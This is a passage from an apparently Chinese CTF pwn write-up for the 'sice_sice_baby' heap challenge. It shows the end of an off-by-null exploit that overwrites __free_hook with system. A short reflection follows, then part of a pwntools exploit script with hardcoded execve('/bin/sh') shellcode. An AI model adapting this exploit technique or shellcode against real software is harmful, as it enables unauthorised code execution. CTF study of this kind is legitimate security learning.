        edit(0x40,p64(addr+libc.sym['__free_hook']-8))
        add(0xe8)
        add(0xe8)
        edit(0x3b,"/bin/sh\x00"+p64(addr+libc.sym['system']))
        delete(0x3b)
## 总结
难度不是特别大，但是就是有点麻烦
​ 起始之前遇到过2.29以上的堆块off-by-null,但是之前没有申请大小的限制，所以用的largebin去残留heap地址进而绕过unlink检测，这次加了限制之后就比较复杂，利用unsortbin成链去绕过的unlink，总体来说还是学到了很多，复习了很多glibc知识，菜还是菜了，希望文章对大家有用~~~
## exp
    # _*_ coding:utf-8 _*_
    from pwn import *
    context.log_level = 'debug'
    context.terminal=['tmux', 'splitw', '-h']
    prog = './sice_sice_baby'
    #elf = ELF(prog)
    p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so")
    # p = remote("124.70.197.50", 9010)
    def debug(addr,PIE=True): 
        debug_str = ""
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
            for i in addr:
                debug_str+='b *{}\n'.format(hex(text_base+i))
            gdb.attach(p,debug_str) 
        else:
            for i in addr:
                debug_str+='b *{}\n'.format(hex(text_base+i))
            gdb.attach(p,debug_str) 
    def dbg():
        gdb.attach(p)
    #-----------------------------------------------------------------------------------------    s       = lambda data               :p.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
    sl      = lambda data               :p.sendline(str(data)) 
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    it      = lambda                    :p.interactive()
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    bp      = lambda bkp                :pdbg.bp(bkp)
    li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))
    def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")
    def lg(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
    #https://www.exploit-db.com/shellcodes
    #-----------------------------------------------------------------------------------------    def choice(idx):
        sla("> ",str(idx))
    def add(sz):
        choice(1)
        sla("> ",sz)
          # qword_4380[v4] = malloc(v3);
          # dword_4040[v4] = v3;
          # dword_41E0[v4] = 0;
        # sla('Content:',con)
    def delete(idx):#no pointer check
        choice(2)
        sla("> ",idx)
        # free((void *)qword_4380[v2]);
        # qword_4380[v2] = 0LL;
        # dword_4040[v2] = 0;
        # dword_41E0[v2] = 0;
    def edit(idx,con):
        choice(3)
        sla("> ",idx)
        # sla('update?',addr)
        sa("> ",con)
        # *(_BYTE *)(qword_4380[v2] + v3) = 0;
        # dword_41E0[v2] = 1;
    def show(idx):
        choice(4)
        sla("> ",idx)
    # v2 